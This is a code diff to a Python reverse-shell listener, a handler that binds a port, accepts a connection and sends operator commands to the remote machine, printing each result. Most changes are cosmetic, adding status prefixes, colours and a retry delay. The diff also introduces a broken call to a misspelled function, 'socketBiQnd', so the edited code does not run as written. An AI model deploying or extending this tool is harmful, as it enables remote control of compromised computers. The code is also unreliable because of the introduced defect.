@@ -1,6 +1,7 @@
 import os
 import sys
 import socket
+import time
 
 def socketCreate():
     try:
@@ -9,7 +10,7 @@ def socketCreate():
         global s
 
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        using = '\33[91;1musing\33[00m(\33[92;1mlistener\33[00m) '
+        using = '\33[91musing\33[00m(\33[92;1mlistener\33[00m) '
         host = input(using + 'host<( ')
         port = int(input(using + 'port<( '))
         if port == '':
@@ -20,12 +21,13 @@ def socketCreate():
 
 def socketBind():
     try:
-        print('Listening on port ' + str(port))
+        print('[*]Listening on port ' + str(port))
         s.bind((host,port))
         s.listen(1)
     except:
-        print('binding error')
-        print('trying')
+        print('[-]binding error')
+        print('[^]trying')
+        time.sleep(3)
         socketBind()
 
 def socketAccept():
@@ -35,10 +37,10 @@ def socketAccept():
 
     try:
         conn, addr = s.accept()
-        print('[*] Sessions Opened | ' + 'IP :\33[92;1m ' + addr[0] + '\33[00m | Port : \33[92;1m' + str(addr[1])+'\33[00m\n')
+        print('[+] Sessions Opened | ' + 'IP :\33[92m ' + addr[0] + '\33[00m | Port : \33[92m' + str(addr[1])+'\33[00m\n')
         
     except:
-        print('accepting error ')
+        print('[-]Failed to accept connections ')
 
 def menu():
     while True:
@@ -50,11 +52,11 @@ def menu():
         command = conn.send(cmd)
         result = conn.recv(16834)
         print(result)
-
+        
 
 def listener():
     socketCreate()
-    socketBind()
+    socketBiQnd()
     socketAccept()
     menu()
 
